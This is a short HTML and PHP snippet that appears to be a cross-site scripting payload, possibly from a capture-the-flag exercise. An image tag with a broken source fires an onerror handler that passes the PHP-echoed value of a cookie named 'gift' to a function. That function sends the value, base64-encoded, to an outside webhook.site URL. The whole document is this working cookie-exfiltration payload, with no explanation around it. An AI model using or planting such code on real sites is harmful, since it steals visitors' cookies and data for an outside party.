<img src='x' onerror="print(<?php echo $_COOKIE["gift"] ?>)">
<script>
        function print(num){
            fetch('https://webhook.site/df59d79f-07f6-49e3-899c-e8aa36a4bebe?'+btoa(num));
        }
	</script>
